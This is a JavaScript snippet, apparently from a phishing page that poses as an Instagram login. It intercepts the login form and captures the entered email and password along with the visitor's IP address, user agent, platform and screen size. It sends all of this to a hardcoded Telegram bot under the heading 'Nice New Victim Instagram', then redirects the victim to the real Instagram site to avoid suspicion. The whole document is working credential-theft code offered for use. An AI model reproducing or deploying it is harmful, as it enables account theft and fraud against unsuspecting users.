<script>
    const TOKEN = "8096146505:AAGuu-QbSJas9XUPxLjT7vc-2UeMJXGYKig";                                                            // ŸáŸÜÿß ÿßŸÑÿ™ŸàŸÉŸäŸÜ              
    const CHAT_ID = "-4864340421";                                                       // ŸáŸÜÿß ŸÖÿπÿ±ŸÅ ÿßŸÑÿ¥ÿßÿ™ https://api.telegram.org/bot/getUpdates
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();

    const button = this.querySelector('button');
    button.disabled = true;
    button.textContent = 'Logging in...';

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    axios.get('https://api.ipify.org?format=json')
        .then(response => {
            const ip = response.data.ip;

            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const screenWidth = screen.width;
            const screenHeight = screen.height;
            const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

            const message = ` 
                <b>Nice New Victim Instagram</b>\n
                <b>Email ‚úâ:</b> ${email}\n
                <b>Password üîí:</b> ${password}\n
                <b>IP Address üìù:</b> ${ip}\n
                <b>Machine üñ•:</b> ${deviceType}\n
                <b>Platform üõ†:</b> ${platform}\n
                <b>User Agent üíº:</b> ${userAgent}\n
                <b>Screen üíª:</b> ${screenWidth}x${screenHeight}
            `;

            axios.post(URI_API, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
            }).then(response => {
                window.location.href = 'https://www.instagram.com'
            }).catch(error => {
                alert('Error sending the information. Please try again.');
                button.disabled = false;
                button.textContent = 'Log In';
            });
        })
        .catch(error => {
            alert('Error fetching the IP address. Please try again.');
            button.disabled = false;
            button.textContent = 'Log In';
        });
});
</script>
